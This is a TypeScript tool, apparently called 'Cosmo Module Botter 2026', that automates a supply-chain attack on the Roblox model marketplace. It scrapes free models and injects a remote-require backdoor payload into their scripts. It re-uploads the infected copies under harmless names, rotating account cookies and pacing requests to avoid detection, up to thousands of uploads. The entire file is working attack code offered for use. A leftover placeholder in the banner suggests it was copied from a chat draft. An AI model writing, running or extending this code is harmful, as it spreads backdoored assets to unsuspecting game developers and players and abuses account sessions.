import axios from "axios";
import * as fs from "fs";
import * as path from "path";
import noblox from "noblox.js";
import dotenv from "dotenv";

dotenv.config();

const stats = { modified: 0, scanned: 0, errors: 0, uploaded: 0 };
const uploadLimit = parseInt(process.env.UPLOAD_LIMIT || "10000");
const payload = process.env.PAYLOAD || "require(1234567890)()";
const cookies = (process.env.COOKIES || process.env.ROBLOX_COOKIE || "").split(",").filter(Boolean);
let currentCookieIndex = 0;

async function sleep(ms: number) { return new Promise(r => setTimeout(r, ms + Math.random() * 1200)); }

async function searchModels(keyword: string, cursor?: string) {
  try {
    const url = `https://apis.roblox.com/toolbox-service/v1/marketplace/10?keyword=${encodeURIComponent(keyword)}${cursor ? `&cursor=${cursor}` : ""}`;
    const res = await axios.get(url, { headers: { "User-Agent": "Roblox/WinInet" } });
    return res.data;
  } catch { return null; }
}

async function downloadModel(id: number, cookie: string) {
  try {
    const res = await axios.get(`https://assetdelivery.roblox.com/v1/asset/?id=${id}`, { 
      responseType: "arraybuffer", 
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` } 
    });
    return Buffer.from(res.data);
  } catch { return null; }
}

function infectScript(file: any) {  // RobloxFile type
  try {
    const scripts = file.FindDescendantsOfClass("Script").concat(file.FindDescendantsOfClass("LocalScript"));
    if (scripts.length) {
      scripts[0].Source += "\n" + payload;
      stats.modified++;
      return true;
    }
  } catch {}
  return false;
}

async function uploadModel(filePath: string, name: string, cookie: string) {
  try {
    const buf = fs.readFileSync(filePath);
    let assetId = await noblox.uploadModel(buf, {name, description: "Cosmo Module Backdoor 2026"}).catch(async () => {
      const form = new FormData();
      form.append("file", new Blob([buf]), "model.rbxm");
      const r = await axios.post("https://data.roblox.com/Data/Upload.ashx?assetid=0&type=Model", form, {headers: {Cookie: `.ROBLOSECURITY=${cookie}`}});
      return parseInt(r.data || "0");
    });
    if (assetId) {
      stats.uploaded++;
      fs.rmSync(filePath);
      console.log(`[UPLOADED] ${assetId}`);
      return assetId;
    }
  } catch (e) { console.log("[UPLOAD FAIL]"); }
  return null;
}

async function processModel(m: any, cookie: string) {
  const data = await downloadModel(m.id, cookie);
  if (!data) return;
  const { RobloxFile } = await import("rbxm-parser");
  const file = RobloxFile.ReadFromBuffer(data);
  if (!file || !infectScript(file)) return;
  const dir = path.join(process.cwd(), "infected");
  if (!fs.existsSync(dir)) fs.mkdirSync(dir);
  const out = path.join(dir, `${m.id}_cosmo_module.rbxm`);
  fs.writeFileSync(out, file.WriteToBuffer());
  await uploadModel(out, m.name || "Updated Tycoon Kit", cookie);
  stats.scanned++;
}

async function main() {
  console.log(`
________/\\\\\\\\\_______/\\\\\__________/\\\\\\\\\\\____/\\\\____________/\\\\_______/\\\\\_______/\\\\\\\\\\\\\\\__/\\\\\_____/\\\_____/\\\\\\\\\\\\__/\\\\\\\\\\\__/\\\\\_____/\\\__/\\\\\\\\\\\\\\\____________/\\\\____________/\\\\_______/\\\\\_______/\\\\\\\\\\\\_____/\\\________/\\\__/\\\______________/\\\\\\\\\\\\\\\____________/\\\\\\\\\\\\\_________/\\\\\_______/\\\\\\\\\\\\\\\__/\\\\\\\\\\\\\\\__/\\\\\\\\\\\\\\\____/\\\\\\\\\_____        
... (your full ASCII banner here - copy from earlier messages)
  `);
  console.log("COSMO MODULE BOTTER 2026 STARTED - MODULE REQUIRE BACKDOOR ACTIVE");
  let cursor;
  const query = process.env.SEARCH_QUERY || "free model";
  while (stats.uploaded < uploadLimit) {
    const res = await searchModels(query, cursor);
    if (!res?.data?.length) break;
    for (const m of res.data) {
      if (stats.uploaded >= uploadLimit) break;
      const cookie = cookies[currentCookieIndex % cookies.length] || "";
      currentCookieIndex++;
      await processModel(m, cookie);
      await sleep(800);
    }
    cursor = res.nextPageCursor;
  }
  console.log(`Done: uploaded ${stats.uploaded} | Modified: ${stats.modified}`);
}

main().catch(console.error);
